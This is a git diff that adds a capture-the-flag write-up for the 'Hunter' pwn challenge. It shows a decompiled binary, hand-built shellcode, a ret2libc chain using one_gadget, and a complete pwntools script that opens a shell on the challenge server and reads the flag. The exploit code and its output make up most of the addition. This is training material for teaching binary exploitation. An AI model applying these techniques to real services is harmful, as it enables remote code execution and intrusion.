@@ -293,6 +293,8 @@ payload = "A"*72 + p64(canary) + p64(0x0) + p64(one_gadget)
 p.sendline(payload)
 p.interactive()
 ```
+
+Output:
 ```console
 ┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
 └─$ python2 solve.py                          
@@ -362,6 +364,351 @@ GLUG{1f_y0u_don't_t4k3_r1sk5_y0u_c4n't_cr3at3_4_future!}$
 ```
 
 The flag is: `GLUG{1f_y0u_don't_t4k3_r1sk5_y0u_c4n't_cr3at3_4_future!}`
+
+
+## **Hunter**
+
+### Description
+> When the hunters become the hunted
+
+We were given a binary file
+
+### Solution
+
+```console
+┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/hunter]
+└─$ checksec Hunters
+[*] '/home/kali/Desktop/pwn/foobar_ctf/hunter/Hunters'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+```
+
+Decompile the binary with Ghidra:
+
+```c
+undefined8 main(void)
+
+{
+  long lVar1;
+  undefined8 *puVar2;
+  undefined8 *puVar3;
+  long in_FS_OFFSET;
+  byte bVar4;
+  undefined local_248 [32];
+  undefined local_228 [32];
+  undefined8 local_208 [63];
+  long local_10;
+  
+  bVar4 = 0;
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  setbuf(stdout,(char *)0x0);
+  setbuf(stdin,(char *)0x0);
+  setbuf(stderr,(char *)0x0);
+  printf("What is your name hunter? : ");
+  __isoc99_scanf(&DAT_00102025,local_248);
+  puVar2 = (undefined8 *)
+           "I am the hunter, I am the great unknownOnly my love can conquerI am the, I am the hunter  (I am the hunter)I am the hunter, into the wild, we goGive up your heart, surrender\'Cau se I am the, I am the hunter (I am the, hey!)We\'ve been on this roadTo a place that, one  day, we\'ll knowAdventure to the other side (I am the, I am the)Searching high and low f or the treasure deep in your soulThe fortune teller\'s always rightGot them red eyes in t he nightLike a panther, outta sightGonna sing my battle cry"
+  ;
+  puVar3 = local_208;
+  for (lVar1 = 0x3e; lVar1 != 0; lVar1 = lVar1 + -1) {
+    *puVar3 = *puVar2;
+    puVar2 = puVar2 + (ulong)bVar4 * -2 + 1;
+    puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
+  }
+  *(undefined4 *)puVar3 = *(undefined4 *)puVar2;
+  printf("What is your most precious possession? : ",puVar2,(long)puVar2 + 4);
+  __isoc99_scanf(&DAT_0010205a,local_228);
+  (*(code *)local_248)();
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+```
+We can immediately see that we have code execution with:
+
+```c
+(*(code *)local_248)();
+```
+
+`local_248` was our first input, and we also have control of `local_228`. It's quite easy to figure out that with NX disabled we can put our shell code onto the stack and execute it. All we need to do is call syscall, and prepare our registers: `rax = 0x3b` , `rsi=0x0`, `rdx=0x0` and `rdi = address that contains /bin/sh`.
+
+We also have to make sure that our payload does not contain white space like: '\r', '\n', '\t'
+
+My first attempt at this challenge was basically that. But i failed to construct a payload without white space thus it failed without me, at the time, knowing what the problem was. After that, I had a very different approach which was quite unnecessarily long
+
+My idea was quite simple: I will leak libc address then using ret2libc. Again very similar to Warmup I will use address that i can access on the stack to calculate every other address like: `printf@plt`, `printf@got.plt`, `main_addr`,..etc
+
+Using the return address that was pushed onto the stack:
+```
+gef➤  x/10gx $rsp
+0x7fffffffdc98: 0x0000555555555297      0x4141414141414141
+0x7fffffffdca8: 0x0000000000000041      0x0000000000000001
+0x7fffffffdcb8: 0x0000000103ae75f6      0x4141414141414141
+0x7fffffffdcc8: 0x0000000000414141      0x0000012100000000
+0x7fffffffdcd8: 0x0000000000000000      0x656874206d612049
+```
+```assembly
+0x0000555555555295 <+236>:   call   rdx
+0x0000555555555297 <+238>:   mov    eax,0x0
+```
+
+And we have these offsets:
+
+```
+0x1295 <+236>:   call   rdx
+0x1297 <+238>:   mov    eax,0x0
+0x11a9 <main+0>:     endbr64
+0x10a0 <printf@plt>: endbr64
+0x3fc8 <printf@got.plt>:        0x0000000000001050
+```
+
+My first payload was: 
+
+```
+payload = "\x5B\x48\x31\xC0\xB0\xEE\x48\x29\xC3\x53\x49\x89\xDD\xC3"
+sec_payload = "AAAA"
+```
+
+```
+0:  5b                      pop    rbx
+1:  48 31 c0                xor    rax,rax
+4:  b0 ee                   mov    al,0xee
+6:  48 29 c3                sub    rbx,rax
+9:  53                      push   rbx
+a:  49 89 dd                mov    r13,rbx
+d:  c3                      ret
+```
+`rbx` will have addresss of `0x1297 <+238>:   mov    eax,0x0` then we calculate with the offset
+
+`r13 = main_addr`
+
+With this we can cyle over main function over and over again
+
+```
+payload = "\x4D\x89\xEE\x48\x31\xC0\x66\xB8\x1F\x2E\x49\x01\xC6\x41\x55\xC3"
+```
+
+```
+0:  4d 89 ee                mov    r14,r13
+3:  48 31 c0                xor    rax,rax
+6:  66 b8 1f 2e             mov    ax,0x2e1f
+a:  49 01 c6                add    r14,rax
+d:  41 55                   push   r13
+f:  c3                      ret
+```
+`r14 = printf@got.plt_addr`
+
+```
+payload = "\x4D\x89\xF7\x48\x31\xC0\x66\xB8\x28\x2F\x49\x29\xC7\x41\x55\xC3"
+```
+
+```
+0:  4d 89 f7                mov    r15,r14
+3:  48 31 c0                xor    rax,rax
+6:  66 b8 28 2f             mov    ax,0x2f28
+a:  49 29 c7                sub    r15,rax
+d:  41 55                   push   r13
+f:  c3                      ret
+```
+`r15= printf@plt_addr`
+
+```
+payload = "\x4C\x89\xF7\x41\xFF\xD7\x41\x55\xC3"
+```
+
+```
+0:  4c 89 f7                mov    rdi,r14
+3:  41 ff d7                call   r15
+6:  41 55                   push   r13
+8:  c3                      ret
+```
+Call puts(`r14=printf@got.plt_addr`)
+
+After that all we need to do is find libc version then ret2libc with one_gadget
+
+```console
+┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/hunter]
+└─$ one_gadget libc6_2.23-0ubuntu11.2_amd64.so
+0x45226 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+```
+
+```
+payload1 = "\x58"*5 + "\x48\x31\xC0\xC3"
+payload2 = p64(one_gadget)
+```
+
+```
+0:  58                      pop    rax
+1:  58                      pop    rax
+2:  58                      pop    rax
+3:  58                      pop    rax
+4:  58                      pop    rax
+5:  48 31 c0                xor    rax,rax
+8:  c3                      ret
+```
+
+Because our `payload1` and `payload2` are quite close to each other on the stack, we can pop our `rsp` into our `payload2`, which holds the address of our `one_gadget`, then we return ( And set rax = 0 to satisfy the one_gadget constraints)
+
+Here's my script:
+```python
+from pwn import *
+
+context.log_level = 'debug'
+LOCAL = False
+REMOTE = True
+
+if REMOTE:
+	p = remote('chall.nitdgplug.org',30090)
+if LOCAL:
+	#p = process('./Hunters')
+	p = gdb.debug('./Hunters')
+	log.info("PID: " + str(p.pid))
+	
+# ---SET R13 = MAIN_ADDR---
+payload = "\x5B\x48\x31\xC0\xB0\xEE\x48\x29\xC3\x53\x49\x89\xDD\xC3"
+sec_payload = "AAAA"
+p.sendlineafter("What is your name hunter? : ",payload)
+p.sendlineafter("What is your most precious possession? : ",sec_payload)
+
+# ---SET R14 = PUTS_GOT.PLT_ADDR---
+payload = "\x4D\x89\xEE\x48\x31\xC0\x66\xB8\x1F\x2E\x49\x01\xC6\x41\x55\xC3"
+p.sendlineafter("What is your name hunter? : ",payload)
+p.sendlineafter("What is your most precious possession? : ",sec_payload)
+
+# ---SET R15 = PUTS.PLT_ADDR---
+payload = "\x4D\x89\xF7\x48\x31\xC0\x66\xB8\x28\x2F\x49\x29\xC7\x41\x55\xC3"
+p.sendlineafter("What is your name hunter? : ",payload)
+p.sendlineafter("What is your most precious possession? : ",sec_payload)
+
+# ---CALL PUTS(PUTS_GOT.PLT_ADDR)---
+payload = "\x4C\x89\xF7\x41\xFF\xD7\x41\x55\xC3"
+p.sendlineafter("What is your name hunter? : ",payload)
+p.sendlineafter("What is your most precious possession? : ",sec_payload)
+printf_libc = p.recv(6)
+printf_libc = printf_libc + chr(0) + chr(0)
+printf_libc = u64(printf_libc)
+log.info("Printf Libc Address: " + hex(printf_libc))
+
+pause()
+# ---CALCULATE BASE LIBC ADDRESS WITH OFFSET---
+base_libc = printf_libc - 0x55810
+one_gadget = base_libc + 0x45226
+
+# ---POP RSP INTO OUR PAYLOAD2 THEN RET2LIBC---
+payload1 = "\x58"*5 + "\x48\x31\xC0\xC3"
+payload2 = p64(one_gadget)
+p.sendlineafter("What is your name hunter? : ",payload1)
+p.sendlineafter("What is your most precious possession? : ",payload2)
+p.interactive()
+```
+
+Output:
+```console
+┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/hunter]
+└─$ python2 solve.py                          
+[+] Opening connection to chall.nitdgplug.org on port 30090: Done
+[DEBUG] Received 0x1c bytes:
+    'What is your name hunter? : '
+[DEBUG] Sent 0xf bytes:
+    00000000  5b 48 31 c0  b0 ee 48 29  c3 53 49 89  dd c3 0a     │[H1·│··H)│·SI·│···│
+    0000000f
+[DEBUG] Received 0x29 bytes:
+    'What is your most precious possession? : '
+[DEBUG] Sent 0x5 bytes:
+    'AAAA\n'
+[DEBUG] Received 0x1c bytes:
+    'What is your name hunter? : '
+[DEBUG] Sent 0x11 bytes:
+    00000000  4d 89 ee 48  31 c0 66 b8  1f 2e 49 01  c6 41 55 c3  │M··H│1·f·│·.I·│·AU·│
+    00000010  0a                                                  │·│
+    00000011
+[DEBUG] Received 0x29 bytes:
+    'What is your most precious possession? : '
+[DEBUG] Sent 0x5 bytes:
+    'AAAA\n'
+[DEBUG] Received 0x1c bytes:
+    'What is your name hunter? : '
+[DEBUG] Sent 0x11 bytes:
+    00000000  4d 89 f7 48  31 c0 66 b8  28 2f 49 29  c7 41 55 c3  │M··H│1·f·│(/I)│·AU·│
+    00000010  0a                                                  │·│
+    00000011
+[DEBUG] Received 0x29 bytes:
+    'What is your most precious possession? : '
+[DEBUG] Sent 0x5 bytes:
+    'AAAA\n'
+[DEBUG] Received 0x1c bytes:
+    'What is your name hunter? : '
+[DEBUG] Sent 0xa bytes:
+    00000000  4c 89 f7 41  ff d7 41 55  c3 0a                     │L··A│··AU│··│
+    0000000a
+[DEBUG] Received 0x29 bytes:
+    'What is your most precious possession? : '
+[DEBUG] Sent 0x5 bytes:
+    'AAAA\n'
+[DEBUG] Received 0x6 bytes:
+    00000000  10 d8 94 39  fb 7f                                  │···9│··│
+    00000006
+[*] Printf Libc Address: 0x7ffb3994d810
+[*] Paused (press any to continue)
+[DEBUG] Received 0x1c bytes:
+    'What is your name hunter? : '
+[DEBUG] Sent 0xa bytes:
+    00000000  58 58 58 58  58 48 31 c0  c3 0a                     │XXXX│XH1·│··│
+    0000000a
+[DEBUG] Received 0x29 bytes:
+    'What is your most precious possession? : '
+[DEBUG] Sent 0x9 bytes:
+    00000000  26 d2 93 39  fb 7f 00 00  0a                        │&··9│····│·│
+    00000009
+[*] Switching to interactive mode
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    'ls\n'
+[DEBUG] Received 0x33 bytes:
+    'Hunters\n'
+    'Hunters.c\n'
+    'bin\n'
+    'dev\n'
+    'flag.txt\n'
+    'lib\n'
+    'lib32\n'
+    'lib64\n'
+Hunters
+Hunters.c
+bin
+dev
+flag.txt
+lib
+lib32
+lib64
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    'cat flag.txt\n'
+[DEBUG] Received 0x19 bytes:
+    'GLUG{egg_HUnTER_cH@MpIoN}'
+GLUG{egg_HUnTER_cH@MpIoN}
+```
+
+The flag is: `GLUG{egg_HUnTER_cH@MpIoN}`
+
+
+
+
+
+
+
+
+
+
+
 
 
 
